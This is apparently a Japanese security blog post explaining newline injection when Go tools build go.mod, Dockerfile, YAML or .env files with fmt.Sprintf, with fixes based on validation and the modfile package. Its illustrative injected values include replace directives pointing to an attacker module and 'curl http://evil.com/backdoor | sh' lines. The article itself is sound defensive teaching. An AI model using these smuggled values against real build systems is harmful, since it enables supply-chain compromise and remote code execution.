## はじめに

Go でツールを書くとき、一時的な `go.mod` や設定ファイルを `fmt.Sprintf` で生成するパターンは珍しくない。コンパイラやコード生成ツールでは、ビルド用の一時ディレクトリに `go.mod` を動的に作成するケースがよくある。

筆者が Go で書かれたコード生成ツールのコンパイラ部分をセキュリティレビューした際、まさにこのパターンで改行インジェクションの脆弱性を発見した。本記事では、文字列結合による設定ファイル生成がなぜ危険なのか、具体的な攻撃シナリオと修正方法を解説する。

## 問題のコード: go.mod を動的に生成する

以下は、コンパイラがビルド用の一時ディレクトリで `go.mod` を生成するコードだ。

```go
// ユーザーの go.mod からバージョンを読み取り、一時ディレクトリに新しい go.mod を生成
goVersion := readGoVersion(goModPath)  // バリデーションなし
modRoot := findModuleRoot()             // 改行チェックなし

modContent := fmt.Sprintf(
    "module build\n\ngo %s\n\nrequire example.com/lib v0.0.0\n\nreplace example.com/lib => %s\n",
    goVersion, modRoot,
)
os.WriteFile("go.mod", []byte(modContent), 0o644)
```

`goVersion` と `modRoot` という2つの外部入力が、バリデーションなしに `go.mod` のテキストに埋め込まれている。

## 攻撃シナリオ1: Go バージョンの改ざん

`goVersion` に改行を含む値を注入するケースを考える。ユーザーの `go.mod` ファイルが何らかの方法で改ざんされ、Go バージョンフィールドに以下の値が設定されていた場合を想定しよう。

```text
1.22\n\nreplace example.com/lib => github.com/attacker/malicious v1.0.0
```

生成される `go.mod` はこうなる。

```text
module build

go 1.22

replace example.com/lib => github.com/attacker/malicious v1.0.0

require example.com/lib v0.0.0

replace example.com/lib => /legitimate/path
```

`replace` ディレクティブが2つ存在する状態になる。`go.mod` パーサーの挙動次第では、攻撃者の指定したモジュールの方が優先される可能性もある。

## 攻撃シナリオ2: モジュールパスの改ざん

`modRoot` に改行を含む値が入った場合も同様だ。

`modRoot` に以下の値を設定したとする。

`/tmp/evil\nreplace example.com/lib => github.com/attacker/malicious v1.0.0`

生成される `go.mod` はこうなる。

```text
module build

go 1.22

require example.com/lib v0.0.0

replace example.com/lib => /tmp/evil
replace example.com/lib => github.com/attacker/malicious v1.0.0
```

## なぜ危険なのか

この攻撃が深刻な理由は3つある。

1つ目は、`go.mod` の `replace` ディレクティブがビルド時の依存解決を完全に上書きすることだ。正規のライブラリを悪意あるフォークに差し替えることが可能になる。

2つ目は、サプライチェーン攻撃の入口になることだ。差し替えたモジュールに任意のコードを仕込めば、ビルド時に `init()` 関数経由で実行できる。

3つ目は、CI/CD パイプラインで自動ビルドされる場合、人間のレビューなしに悪意あるコードが実行されることだ。生成された `go.mod` の内容を確認する仕組みがなければ、攻撃に気付かない。

## 修正方法

```go
var validGoVersion = regexp.MustCompile(`^\d+\.\d+(\.\d+)?$`)

func sanitizeGoVersion(ver string) (string, error) {
    if !validGoVersion.MatchString(ver) {
        return "", fmt.Errorf("invalid go version: %q", ver)
    }
    return ver, nil
}

func buildModContent(goVersion, modRoot string) (string, error) {
    // Go バージョンのホワイトリスト検証
    if _, err := sanitizeGoVersion(goVersion); err != nil {
        return "", err
    }
    // 改行文字のチェック
    if strings.ContainsAny(goVersion, "\n\r") {
        return "", fmt.Errorf("go version contains invalid characters: %q", goVersion)
    }
    if strings.ContainsAny(modRoot, "\n\r") {
        return "", fmt.Errorf("module root path contains invalid characters: %q", modRoot)
    }

    return fmt.Sprintf(
        "module build\n\ngo %s\n\nrequire example.com/lib v0.0.0\n\nreplace example.com/lib => %s\n",
        goVersion, modRoot,
    ), nil
}
```

修正のポイントは3つだ。

- Go バージョンは正規表現でホワイトリスト検証する。数字とドット以外を受け付けない
- パス文字列は改行・復帰文字を拒否する
- エラーを返すことで、不正な入力を早期に検出する

## この問題が発生しやすいパターン

`go.mod` 以外でも、`fmt.Sprintf` で構造化テキストを生成するパターンには同じリスクがある。

**Dockerfile の動的生成**では、`FROM` のイメージ名に改行を注入すると `RUN` ディレクティブを追加できる。

```go
// 危険
content := fmt.Sprintf("FROM %s\nRUN go build .", imageName)

// imageName が "golang:1.22\nRUN curl http://evil.com/backdoor | sh" だった場合
// FROM golang:1.22
// RUN curl http://evil.com/backdoor | sh
// RUN go build .
```

**YAML の文字列結合**では、インデントやキーの注入が可能になる。

```go
// 危険
content := fmt.Sprintf("name: %s\nversion: 1.0", userName)

// userName が "evil\nscripts:\n  post-install: curl http://evil.com | sh" だった場合
// name: evil
// scripts:
//   post-install: curl http://evil.com | sh
// version: 1.0
```

**`.env` ファイルの生成**では、環境変数値に改行を含めると別の環境変数を注入できる。

```go
// 危険
content := fmt.Sprintf("APP_NAME=%s\nDATABASE_URL=postgres://...", appName)

// appName が "myapp\nADMIN_PASSWORD=hacked" だった場合
// APP_NAME=myapp
// ADMIN_PASSWORD=hacked
// DATABASE_URL=postgres://...
```

## より安全なアプローチ: 構造化 API を使う

可能な場合は、テキスト生成ではなく構造化された API を使うべきだ。

```go
// JSON
json.NewEncoder(f).Encode(config)

// YAML
yaml.NewEncoder(f).Encode(config)

// TOML
toml.NewEncoder(f).Encode(config)
```

`go.mod` については `golang.org/x/mod/modfile` パッケージを使えば、プログラム的に `go.mod` を操作できる。文字列結合を避けることで、改行インジェクションのリスクを構造的に排除できる。

```go
// modfile パッケージを使った安全な go.mod 生成
f := &modfile.File{}
f.AddModuleStmt("build")
f.AddGoStmt(goVersion)
f.AddRequire("example.com/lib", "v0.0.0")
f.AddReplace("example.com/lib", "", modRoot, "")
data, err := f.Format()
if err != nil {
    return fmt.Errorf("failed to format go.mod: %w", err)
}
if err := os.WriteFile("go.mod", data, 0o644); err != nil {
    return fmt.Errorf("failed to write go.mod: %w", err)
}
```

## まとめ

- 構造化テキスト（`go.mod`, YAML, Dockerfile 等）を `fmt.Sprintf` で生成する場合、改行・特殊文字のバリデーションは必須だ
- 可能であれば構造化 API（`encoding/json`, `gopkg.in/yaml.v3`, `golang.org/x/mod/modfile`）を使う
- 「信頼できる内部値」でも防御的バリデーションを入れるべきだ。将来の変更で信頼境界は変わりうる
- 設定ファイル生成コードをレビューする際は「この値に改行が入ったらどうなるか」を常に考えるべきだ
